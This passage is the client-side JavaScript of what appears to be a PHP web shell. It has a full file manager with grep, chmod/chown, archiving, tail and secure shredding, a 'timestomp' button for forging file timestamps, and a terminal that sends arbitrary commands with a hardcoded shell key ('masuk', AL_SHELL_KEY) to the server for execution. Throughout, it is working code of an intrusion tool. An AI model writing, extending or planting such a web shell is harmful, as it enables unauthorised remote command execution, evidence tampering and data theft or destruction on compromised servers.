        var results = document.getElementById('fmGrepResults');
        status.textContent = 'Searching...';
        results.innerHTML = '';
        fetch(BASE + '&d=' + DIRENC + '&action=fm_grep&pattern=' + encodeURIComponent(pattern) + '&search_dir=' + encodeURIComponent(grepDir) + '&ext=' + encodeURIComponent(ext))
            .then(function(r) { return r.json(); })
            .then(function(data) {
                status.textContent = 'Found ' + data.total + ' match(es)' + (data.total >= data.max ? ' (limit reached)' : '');
                if (data.results.length === 0) { results.innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-dim)">No matches found</div>'; return; }
                var html = '';
                data.results.forEach(function(r) {
                    var parentDir = r.file.substring(0, r.file.lastIndexOf(r.file.indexOf('/') !== -1 ? '/' : '\\'));
                    html += '<div class="fm-search-item" onclick="window.location.href=\'' + BASE + '&d=' + encodeURIComponent(parentDir) + '\'">';
                    html += '<div class="fm-search-path">' + escapeHtml(r.filename) + ':' + r.line + '</div>';
                    html += '<div class="fm-search-match">' + escapeHtml(r.content) + '</div>';
                    html += '<div class="fm-search-line">' + escapeHtml(r.file) + '</div>';
                    html += '</div>';
                });
                results.innerHTML = html;
            }).catch(function(e) { status.textContent = 'Error: ' + e.message; });
    };

    // ===== QUICK FILTER =====
    var fmQuickFilter = document.getElementById('fmQuickFilter');
    if (fmQuickFilter) {
        fmQuickFilter.addEventListener('input', function() {
            var val = this.value.toLowerCase();
            var rows = document.querySelectorAll('.fm-file-row');
            rows.forEach(function(row) {
                var name = (row.getAttribute('data-filename') || '').toLowerCase();
                if (val === '' || name.indexOf(val) !== -1) { row.style.display = ''; }
                else { row.style.display = 'none'; }
            });
        });
    }

    // ===== TYPE FILTER =====
    var fmTypeFilter = document.getElementById('fmTypeFilter');
    if (fmTypeFilter) {
        fmTypeFilter.addEventListener('change', function() {
            var val = this.value;
            var rows = document.querySelectorAll('.fm-file-row');
            rows.forEach(function(row) {
                var cat = row.getAttribute('data-category') || '';
                if (val === '' || cat === val || cat === 'dir') { row.style.display = ''; }
                else { row.style.display = 'none'; }
            });
        });
    }

    // ===== GRID VIEW TOGGLE =====
    var fmIsGrid = false;
    var fmGridBtn = document.getElementById('fmGridToggle');
    if (fmGridBtn) {
        fmGridBtn.addEventListener('click', function() {
            fmIsGrid = !fmIsGrid;
            var gridView = document.getElementById('fmGridView');
            var tableWrap = document.getElementById('fmTableWrap');
            if (fmIsGrid) {
                tableWrap.style.display = 'none';
                gridView.style.display = '';
                fmBuildGrid();
            } else {
                tableWrap.style.display = '';
                gridView.style.display = 'none';
            }
        });
    }
    function fmBuildGrid() {
        var grid = document.getElementById('fmGridView');
        var rows = document.querySelectorAll('.fm-file-row');
        var html = '';
        var mediaExts = ['jpg','jpeg','png','gif','svg','webp','bmp','ico'];
        rows.forEach(function(row) {
            if (row.style.display === 'none') return;
            var name = row.getAttribute('data-filename');
            var cat = row.getAttribute('data-category');
            var ext = row.getAttribute('data-ext');
            var isDir = cat === 'dir';
            var iconCell = row.cells[1];
            var icon = iconCell ? iconCell.textContent.trim() : '📄';
            var sizeBytes = parseInt(row.getAttribute('data-size') || '0');
            var isImage = mediaExts.indexOf(ext) !== -1;
            var thumbHtml = '';
            if (isImage) {
                thumbHtml = '<img class="fm-grid-thumb" src="' + BASE + '&d=' + DIRENC + '&action=fm_preview&file=' + encodeURIComponent(name) + '" alt="" loading="lazy">';
            } else {
                thumbHtml = '<span class="fm-grid-icon">' + icon + '</span>';
            }
            var clickAction = isDir
                ? 'window.location.href=\'' + BASE + '&d=' + encodeURIComponent(DIR + (DIR.indexOf('/') !== -1 ? '/' : '\\') + name) + '\''
                : (isImage ? 'fmPreviewMedia(\'' + name.replace(/'/g, "\\'") + '\')' : 'viewFileAsync(\'' + name.replace(/'/g, "\\'") + '\')');
            html += '<div class="fm-grid-item" ondblclick="' + clickAction + '" data-filename="' + escapeHtml(name) + '">';
            html += '<input type="checkbox" class="fm-grid-check file-select" value="' + escapeHtml(name) + '">';
            html += thumbHtml;
            html += '<div class="fm-grid-name">' + escapeHtml(name) + '</div>';
            if (!isDir) html += '<div class="fm-grid-size">' + fmFormatSize(sizeBytes) + '</div>';
            html += '</div>';
        });
        grid.innerHTML = html;
    }

    // ===== MEDIA PREVIEW / LIGHTBOX =====
    window.fmPreviewMedia = function(fileName) {
        var lb = document.getElementById('fmLightbox');
        var content = document.getElementById('fmLightboxContent');
        var title = document.getElementById('fmLightboxTitle');
        var ext = fileName.split('.').pop().toLowerCase();
        var url = BASE + '&d=' + DIRENC + '&action=fm_preview&file=' + encodeURIComponent(fileName);
        var imageExts = ['jpg','jpeg','png','gif','svg','webp','bmp','ico'];
        var videoExts = ['mp4','avi','mkv','mov','webm','flv'];
        var audioExts = ['mp3','wav','ogg','flac','aac','m4a'];

        if (imageExts.indexOf(ext) !== -1) {
            content.innerHTML = '<img src="' + url + '" alt="' + escapeHtml(fileName) + '">';
        } else if (videoExts.indexOf(ext) !== -1) {
            content.innerHTML = '<video controls autoplay><source src="' + url + '">Your browser does not support video.</video>';
        } else if (audioExts.indexOf(ext) !== -1) {
            content.innerHTML = '<audio controls autoplay><source src="' + url + '">Your browser does not support audio.</audio>';
        } else {
            content.innerHTML = '<div style="color:#fff;font-size:14px;">Preview not available for this file type</div>';
        }
        title.textContent = fileName;
        lb.classList.add('active');
    };
    window.fmCloseLightbox = function() {
        var lb = document.getElementById('fmLightbox');
        lb.classList.remove('active');
        document.getElementById('fmLightboxContent').innerHTML = '';
    };
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            var lb = document.getElementById('fmLightbox');
            if (lb && lb.classList.contains('active')) { fmCloseLightbox(); e.preventDefault(); }
        }
    });

    // ===== CONTEXT MENU =====
    var ctxTarget = { name: '', isDir: false };
    window.fmContextMenu = function(e, fileName, isDir) {
        e.preventDefault();
        ctxTarget = { name: fileName, isDir: isDir };
        var menu = document.getElementById('fmContextMenu');
        menu.style.display = 'block';
        menu.style.left = Math.min(e.clientX, window.innerWidth - 200) + 'px';
        menu.style.top = Math.min(e.clientY, window.innerHeight - 300) + 'px';
        var ext = fileName.split('.').pop().toLowerCase();
        var mediaExts = ['jpg','jpeg','png','gif','svg','webp','bmp','ico','mp4','avi','mkv','mov','webm','flv','mp3','wav','ogg'];
        menu.querySelector('[data-action="preview"]').style.display = mediaExts.indexOf(ext) !== -1 ? '' : 'none';
        menu.querySelector('[data-action="open"]').style.display = isDir ? '' : 'none';
        menu.querySelector('[data-action="tail"]').style.display = (!isDir && ['log','txt','conf','cfg','ini','env'].indexOf(ext) !== -1) ? '' : 'none';
    };
    document.addEventListener('click', function() {
        document.getElementById('fmContextMenu').style.display = 'none';
    });
    document.getElementById('fmContextMenu').addEventListener('click', function(e) {
        var item = e.target.closest('.fm-ctx-item');
        if (!item) return;
        var action = item.getAttribute('data-action');
        var name = ctxTarget.name;
        switch (action) {
            case 'open': window.location.href = BASE + '&d=' + encodeURIComponent(DIR + (DIR.indexOf('/') !== -1 ? '/' : '\\') + name); break;
            case 'view': viewFileAsync(name); break;
            case 'edit': openEditModal(name); break;
            case 'preview': fmPreviewMedia(name); break;
            case 'copy': fmCopyFiles([name]); break;
            case 'cut': fmCutFiles([name]); break;
            case 'rename': openRenameModal(name); break;
            case 'info': fmShowInfo(name); break;
            case 'chmod': openChmodModal(name); break;
            case 'chown': fmOpenChown(name); break;
            case 'download': window.open(BASE + '&d=' + DIRENC + '&download=' + encodeURIComponent(name), '_blank'); break;
            case 'tail': fmTailFile(name); break;
            case 'delete': openDeleteModal(name); break;
            case 'shred': fmOpenShred([name]); break;
        }
    });

    // ===== FILE INFO / PROPERTIES =====
    window.fmShowInfo = function(fileName) {
        openModal('fmInfoModal');
        document.getElementById('fmInfoTitle').textContent = 'Properties: ' + fileName;
        document.getElementById('fmInfoBody').innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-dim)">Loading...</div>';
        fetch(BASE + '&d=' + DIRENC + '&action=fm_file_info&file=' + encodeURIComponent(fileName))
            .then(function(r) { return r.json(); })
            .then(function(info) {
                var html = '<div class="fm-info-grid">';
                var rows = [
                    ['Name', info.name],
                    ['Full Path', info.full_path],
                    ['Type', info.type + (info.mime && info.mime !== 'directory' ? ' (' + info.mime + ')' : '')],
                    ['Size', info.type === 'directory'
                        ? fmFormatSize(info.dir_size || 0) + ' (' + (info.dir_files || 0) + ' files, ' + (info.dir_dirs || 0) + ' dirs)'
                        : fmFormatSize(info.size)],
                    ['Permissions', info.perms + ' (' + info.perms_human + ')'],
                    ['Owner', info.owner + ' (uid: ' + info.owner_id + ')'],
                    ['Group', info.group + ' (gid: ' + info.group_id + ')'],
                    ['Inode', info.inode],
                    ['Links', info.links],
                    ['Created', info.created],
                    ['Modified', info.modified],
                    ['Accessed', info.accessed],
                    ['Readable', info.readable ? 'Yes' : 'No'],
                    ['Writable', info.writable ? 'Yes' : 'No'],
                    ['Executable', info.executable ? 'Yes' : 'No'],
                ];
                if (info.is_link) rows.push(['Symlink Target', info.link_target]);
                rows.forEach(function(r) {
                    var valClass = '';
                    if (r[0] === 'Readable' || r[0] === 'Writable') valClass = r[1] === 'Yes' ? 'ok' : 'warn';
                    html += '<div class="fm-info-label">' + r[0] + '</div><div class="fm-info-value ' + valClass + '">' + escapeHtml(String(r[1])) + '</div>';
                });
                html += '</div>';
                html += '<div style="margin-top:12px;display:flex;gap:6px;">';
                html += '<button class="btn small" onclick="openChmodModal(\'' + info.name.replace(/'/g, "\\'") + '\'); closeModal(\'fmInfoModal\')">Chmod</button>';
                html += '<button class="btn small ghost" onclick="fmOpenChown(\'' + info.name.replace(/'/g, "\\'") + '\'); closeModal(\'fmInfoModal\')">Chown</button>';
                html += '</div>';
                document.getElementById('fmInfoBody').innerHTML = html;
            }).catch(function(e) {
                document.getElementById('fmInfoBody').innerHTML = '<div style="color:var(--danger)">Error: ' + escapeHtml(e.message) + '</div>';
            });
    };

    // ===== CHOWN =====
    window.fmOpenChown = function(fileName) {
        document.getElementById('fmChownTitle').textContent = 'Change Owner: ' + fileName;
        document.getElementById('fmChownTarget').value = fileName;
        document.getElementById('fmChownOwner').value = '';
        document.getElementById('fmChownGroup').value = '';
        document.getElementById('fmChownRecursive').checked = false;
        openModal('fmChownModal');
    };
    window.fmExecChown = function() {
        var target = document.getElementById('fmChownTarget').value;
        var owner = document.getElementById('fmChownOwner').value;
        var group = document.getElementById('fmChownGroup').value;
        var recursive = document.getElementById('fmChownRecursive').checked;
        if (!owner && !group) return alert('Enter owner or group');
        var fd = new FormData();
        fd.append('action', 'fm_chown');
        fd.append('d', DIR);
        fd.append('target', target);
        fd.append('owner', owner);
        fd.append('group', group);
        if (recursive) fd.append('recursive', '1');
        fetch(BASE + '&d=' + DIRENC, { method: 'POST', body: fd })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                alert(data.success ? 'Owner changed successfully' : ('Error: ' + (data.message || data.output)));
                closeModal('fmChownModal');
                location.reload();
            }).catch(function(e) { alert('Error: ' + e.message); });
    };

    // ===== ARCHIVE =====
    window.fmOpenArchiveModal = function() {
        var files = fmGetSelectedFiles();
        if (files.length === 0) return alert('Select files first');
        document.getElementById('fmArchiveName').value = 'archive_' + new Date().toISOString().slice(0,10) + '.zip';
        document.getElementById('fmArchiveFormat').value = 'zip';
        document.getElementById('fmArchiveFiles').innerHTML = files.map(function(f) { return '<div>' + escapeHtml(f) + '</div>'; }).join('');
        openModal('fmArchiveModal');
    };
    window.fmUpdateArchiveExt = function() {
        var name = document.getElementById('fmArchiveName').value;
        var format = document.getElementById('fmArchiveFormat').value;
        var base = name.replace(/\.(zip|tar|tar\.gz|tgz)$/i, '');
        var ext = format === 'tar.gz' ? '.tar.gz' : ('.' + format);
        document.getElementById('fmArchiveName').value = base + ext;
    };
    window.fmExecArchive = function() {
        var files = fmGetSelectedFiles();
        var name = document.getElementById('fmArchiveName').value;
        var format = document.getElementById('fmArchiveFormat').value;
        if (!name || files.length === 0) return;
        var fd = new FormData();
        fd.append('action', 'fm_create_archive');
        fd.append('d', DIR);
        fd.append('archive_name', name);
        fd.append('format', format);
        files.forEach(function(f) { fd.append('selected_files[]', f); });
        fetch(BASE + '&d=' + DIRENC, { method: 'POST', body: fd })
            .then(function(r) { return r.json(); })
            .then(function(data) { alert(data.message); closeModal('fmArchiveModal'); if (data.success) location.reload(); })
            .catch(function(e) { alert('Error: ' + e.message); });
    };

    // ===== EXTRACT ARCHIVE =====
    window.fmExtractArchive = function(fileName) {
        document.getElementById('fmExtractFile').value = fileName;
        document.getElementById('fmExtractTo').value = '';
        openModal('fmExtractModal');
    };
    window.fmExecExtract = function() {
        var file = document.getElementById('fmExtractFile').value;
        var extractTo = document.getElementById('fmExtractTo').value;
        var fd = new FormData();
        fd.append('action', 'fm_extract');
        fd.append('d', DIR);
        fd.append('file', file);
        fd.append('extract_to', extractTo);
        fetch(BASE + '&d=' + DIRENC, { method: 'POST', body: fd })
            .then(function(r) { return r.json(); })
            .then(function(data) { alert(data.message); closeModal('fmExtractModal'); if (data.success) location.reload(); })
            .catch(function(e) { alert('Error: ' + e.message); });
    };

    // ===== LIST ARCHIVE =====
    window.fmListArchive = function(fileName) {
        openModal('fmArchiveListModal');
        document.getElementById('fmArchiveListTitle').textContent = 'Contents: ' + fileName;
        document.getElementById('fmArchiveListBody').innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-dim)">Loading...</div>';
        fetch(BASE + '&d=' + DIRENC + '&action=fm_list_archive&file=' + encodeURIComponent(fileName))
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (!data.contents || data.contents.length === 0) {
                    document.getElementById('fmArchiveListBody').innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-dim)">Empty or unable to read</div>';
                    return;
                }
                var html = '<div style="font-size:11.5px;color:var(--text-dim);margin-bottom:8px;">' + data.count + ' entries</div>';
                html += '<div style="max-height:400px;overflow-y:auto;font-size:11.5px;font-family:var(--mono);">';
                data.contents.forEach(function(item) {
                    html += '<div style="padding:2px 0;border-bottom:1px solid var(--border);">' + escapeHtml(item.name);
                    if (item.size > 0) html += ' <span style="color:var(--text-dim)">(' + fmFormatSize(item.size) + ')</span>';
                    html += '</div>';
                });
                html += '</div>';
                document.getElementById('fmArchiveListBody').innerHTML = html;
            }).catch(function(e) {
                document.getElementById('fmArchiveListBody').innerHTML = '<div style="color:var(--danger)">Error: ' + escapeHtml(e.message) + '</div>';
            });
    };

    // ===== TAIL FILE =====
    window.fmTailFile = function(fileName) {
        document.getElementById('fmTailFile').value = fileName;
        document.getElementById('fmTailTitle').textContent = 'Tail: ' + fileName;
        openModal('fmTailModal');
        fmDoTail();
    };
    window.fmDoTail = function() {
        var file = document.getElementById('fmTailFile').value;
        var lines = document.getElementById('fmTailLines').value;
        var contentEl = document.getElementById('fmTailContent');
        contentEl.textContent = 'Loading...';
        fetch(BASE + '&d=' + DIRENC + '&action=fm_tail&file=' + encodeURIComponent(file) + '&lines=' + lines)
            .then(function(r) { return r.json(); })
            .then(function(data) {
                contentEl.textContent = data.content || data.error || 'Empty';
                contentEl.scrollTop = contentEl.scrollHeight;
            }).catch(function(e) { contentEl.textContent = 'Error: ' + e.message; });
    };

    // ===== SHRED =====
    window.fmOpenShred = function(files) {
        var el = document.getElementById('fmShredFiles');
        el.innerHTML = files.map(function(f) { return '<div>💀 ' + escapeHtml(f) + '</div>'; }).join('');
        el.dataset.files = JSON.stringify(files);
        openModal('fmShredModal');
    };
    window.fmExecShred = function() {
        var files = JSON.parse(document.getElementById('fmShredFiles').dataset.files || '[]');
        if (files.length === 0) return;
        var fd = new FormData();
        fd.append('action', 'fm_shred');
        fd.append('d', DIR);
        files.forEach(function(f) { fd.append('selected_files[]', f); });
        fetch(BASE + '&d=' + DIRENC, { method: 'POST', body: fd })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                alert('Shredded: ' + data.shredded + ', Failed: ' + data.failed);
                closeModal('fmShredModal');
                location.reload();
            }).catch(function(e) { alert('Error: ' + e.message); });
    };

    // ===== PATH AUTOCOMPLETE =====
    var acTimeout = null;
    window.fmAutocompletePath = function(input) {
        clearTimeout(acTimeout);
        acTimeout = setTimeout(function() {
            var val = input.value;
            if (val.length < 2) { document.getElementById('fmAutocompleteList').style.display = 'none'; return; }
            fetch(BASE + '&d=' + DIRENC + '&action=fm_autocomplete&partial=' + encodeURIComponent(val))
                .then(function(r) { return r.json(); })
                .then(function(suggestions) {
                    var list = document.getElementById('fmAutocompleteList');
                    if (suggestions.length === 0) { list.style.display = 'none'; return; }
                    list.innerHTML = suggestions.map(function(s) {
                        return '<div style="padding:4px 8px;cursor:pointer;border-bottom:1px solid var(--border);" onmouseover="this.style.background=\'var(--ok-dim)\'" onmouseout="this.style.background=\'\'" onclick="document.getElementById(\'fmCopyMoveDest\').value=\'' + s.replace(/'/g, "\\'") + '\'; document.getElementById(\'fmAutocompleteList\').style.display=\'none\'">' + escapeHtml(s) + '</div>';
                    }).join('');
                    list.style.display = 'block';
                });
        }, 300);
    };

    // ===== BOOKMARKS =====
    var fmBookmarks = JSON.parse(localStorage.getItem('fmBookmarks') || '[]');
    function fmRenderBookmarks() {
        var bar = document.getElementById('fmBookmarkBar');
        if (!bar) return;
        if (fmBookmarks.length === 0) { bar.style.display = 'none'; return; }
        bar.style.display = 'flex';
        bar.innerHTML = fmBookmarks.map(function(b, i) {
            var name = b.split(/[\/\\]/).pop() || b;
            return '<div class="fm-bookmark-item" onclick="window.location.href=\'' + BASE + '&d=' + encodeURIComponent(b) + '\'" title="' + escapeHtml(b) + '">⭐ ' + escapeHtml(name) + ' <span class="fm-bookmark-remove" onclick="event.stopPropagation(); fmRemoveBookmark(' + i + ')">✕</span></div>';
        }).join('');
    }
    var fmBookmarkBtn = document.getElementById('fmBookmarkBtn');
    if (fmBookmarkBtn) {
        fmBookmarkBtn.addEventListener('click', function() {
            if (fmBookmarks.indexOf(DIR) === -1) {
                fmBookmarks.push(DIR);
                localStorage.setItem('fmBookmarks', JSON.stringify(fmBookmarks));
                fmRenderBookmarks();
                alert('Bookmarked: ' + DIR);
            } else {
                alert('Already bookmarked');
            }
        });
    }
    window.fmRemoveBookmark = function(index) {
        fmBookmarks.splice(index, 1);
        localStorage.setItem('fmBookmarks', JSON.stringify(fmBookmarks));
        fmRenderBookmarks();
    };
    fmRenderBookmarks();

    // ===== KEYBOARD SHORTCUTS =====
    document.addEventListener('keydown', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') return;
        var activeView = document.querySelector('.view.on');
        if (!activeView || activeView.id !== 'view-files') return;

        if (e.ctrlKey && e.key === 'c') { e.preventDefault(); var sel = fmGetSelectedFiles(); if (sel.length) fmCopyFiles(sel); }
        if (e.ctrlKey && e.key === 'x') { e.preventDefault(); var sel = fmGetSelectedFiles(); if (sel.length) fmCutFiles(sel); }
        if (e.ctrlKey && e.key === 'v') { e.preventDefault(); fmPaste(); }
        if (e.ctrlKey && e.key === 'f') { e.preventDefault(); openModal('fmSearchModal'); document.getElementById('fmSearchQuery').focus(); }
        if (e.ctrlKey && e.key === 'g') { e.preventDefault(); openModal('fmGrepModal'); document.getElementById('fmGrepPattern').focus(); }
        if (e.key === 'Delete') { var del = document.getElementById('deleteSelectedBtn'); if (del && !del.disabled) del.click(); }
        if (e.ctrlKey && e.key === 'a') { e.preventDefault(); document.querySelectorAll('.file-select').forEach(function(cb) { cb.checked = true; }); fmUpdateBulkBar(); }
    });

    // ===== TOOLBAR BUTTON BINDINGS =====
    function fmBindBtn(id, fn) { var el = document.getElementById(id); if (el) el.addEventListener('click', fn); }
    fmBindBtn('copySelectedBtn', function() { fmCopyFiles(fmGetSelectedFiles()); });
    fmBindBtn('cutSelectedBtn', function() { fmCutFiles(fmGetSelectedFiles()); });
    fmBindBtn('bulkDownloadBtn', fmBulkDownload);
    fmBindBtn('archiveSelectedBtn', fmOpenArchiveModal);
    fmBindBtn('shredSelectedBtn', function() { var f = fmGetSelectedFiles(); if (f.length) fmOpenShred(f); });
    fmBindBtn('fmSearchBtn', function() { openModal('fmSearchModal'); });
    fmBindBtn('fmGrepBtn', function() { openModal('fmGrepModal'); });

    // ===== HELPER FUNCTIONS =====
    function fmGetSelectedFiles() {
        var files = [];
        document.querySelectorAll('.file-select:checked').forEach(function(cb) { files.push(cb.value); });
        return files;
    }
    function fmFormatSize(bytes) {
        if (bytes === 0) return '0 B';
        var k = 1024;
        var sizes = ['B', 'KB', 'MB', 'GB'];
        var i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    // ===== UPDATE BULK BAR WITH NEW BUTTONS =====
    function fmUpdateBulkBar() {
        var selected = fmGetSelectedFiles();
        var count = selected.length;
        var ids = ['zipSelectedBtn','archiveSelectedBtn','copySelectedBtn','cutSelectedBtn','bulkDownloadBtn','chmodSelectedBtn','timestompSelectedBtn','deleteSelectedBtn','shredSelectedBtn'];
        ids.forEach(function(id) {
            var el = document.getElementById(id);
            if (el) el.disabled = count === 0;
        });
        var bulkCount = document.getElementById('bulkCount');
        if (bulkCount) bulkCount.textContent = count;
    }

    // Override selectAll and file-select checkboxes
    var selectAll = document.getElementById('selectAll');
    if (selectAll) {
        selectAll.addEventListener('change', function() {
            var checked = this.checked;
            document.querySelectorAll('.file-select').forEach(function(cb) {
                if (cb.closest('tr') && cb.closest('tr').style.display !== 'none') cb.checked = checked;
            });
            fmUpdateBulkBar();
        });
    }
    document.addEventListener('change', function(e) {
        if (e.target.classList.contains('file-select')) fmUpdateBulkBar();
    });

    // Enter key handlers for search modals
    var searchInput = document.getElementById('fmSearchQuery');
    if (searchInput) searchInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') fmDoSearch(); });
    var grepInput = document.getElementById('fmGrepPattern');
    if (grepInput) grepInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') fmDoGrep(); });

    // Navigation input autocomplete
    var navInput = document.getElementById('targetDirInput');
    if (navInput) {
        var navAcTimeout = null;
        var navAcList = document.createElement('div');
        navAcList.style.cssText = 'display:none;position:absolute;z-index:9999;background:var(--bg-panel);border:1px solid var(--border);border-radius:4px;max-height:150px;overflow-y:auto;font-size:11.5px;width:100%;left:0;';
        navInput.parentNode.style.position = 'relative';
        navInput.parentNode.appendChild(navAcList);
        navInput.addEventListener('input', function() {
            var val = this.value;
            clearTimeout(navAcTimeout);
            navAcTimeout = setTimeout(function() {
                if (val.length < 2) { navAcList.style.display = 'none'; return; }
                fetch(BASE + '&d=' + DIRENC + '&action=fm_autocomplete&partial=' + encodeURIComponent(val))
                    .then(function(r) { return r.json(); })
                    .then(function(suggestions) {
                        if (suggestions.length === 0) { navAcList.style.display = 'none'; return; }
                        navAcList.innerHTML = suggestions.map(function(s) {
                            return '<div style="padding:4px 8px;cursor:pointer;border-bottom:1px solid var(--border);" onmouseover="this.style.background=\'var(--ok-dim)\'" onmouseout="this.style.background=\'\'" onclick="document.getElementById(\'targetDirInput\').value=\'' + s.replace(/'/g, "\\'") + '\'; this.parentNode.style.display=\'none\'">' + escapeHtml(s) + '</div>';
                        }).join('');
                        navAcList.style.display = 'block';
                    });
            }, 300);
        });
    }

    // FM Terminal
    var fmTermForm = document.getElementById('fmTermForm');
    var fmTermInput = document.getElementById('fmTermInput');
    var fmTermOutput = document.getElementById('fmTermOutput');
    var fmTermHistory = [];
    var fmTermHistIdx = -1;

    if (fmTermForm) {
        fmTermForm.addEventListener('submit', function(e) {
            e.preventDefault();
            var cmd = fmTermInput.value.trim();
            if (!cmd) return;
            fmTermHistory.unshift(cmd);
            fmTermHistIdx = -1;
            fmTermOutput.value += '$ ' + cmd + '\n';
            fmTermOutput.scrollTop = fmTermOutput.scrollHeight;
            fmTermInput.value = '';
            fmTermInput.disabled = true;

            var fd = new FormData();
            fd.append('action', 'fm_exec');
            fd.append('cmd', cmd);
            fd.append('cwd', DIR);
            fd.append('masuk', '<?php echo AL_SHELL_KEY ?>');

            fetch(window.location.href, { method: 'POST', body: fd })
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (data.success && data.output) {
                        fmTermOutput.value += data.output.replace(/\r\n/g, '\n');
                        if (!data.output.endsWith('\n')) fmTermOutput.value += '\n';
                    } else if (data.error) {
                        fmTermOutput.value += 'Error: ' + data.error + '\n';
                    }
                    if (data.timed_out) fmTermOutput.value += '[Command timed out]\n';
                    fmTermOutput.value += '\n';
                    fmTermOutput.scrollTop = fmTermOutput.scrollHeight;
                    fmTermInput.disabled = false;
                    fmTermInput.focus();
                })
                .catch(function(err) {
                    fmTermOutput.value += 'Error: ' + err.message + '\n\n';
                    fmTermOutput.scrollTop = fmTermOutput.scrollHeight;
                    fmTermInput.disabled = false;
                    fmTermInput.focus();
                });
        });

        fmTermInput.addEventListener('keydown', function(e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (fmTermHistIdx < fmTermHistory.length - 1) {
                    fmTermHistIdx++;
                    fmTermInput.value = fmTermHistory[fmTermHistIdx];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (fmTermHistIdx > 0) {
                    fmTermHistIdx--;
                    fmTermInput.value = fmTermHistory[fmTermHistIdx];
                } else {
                    fmTermHistIdx = -1;
                    fmTermInput.value = '';
                }
            }
        });
    }
})();
</script>
</body>
</html>
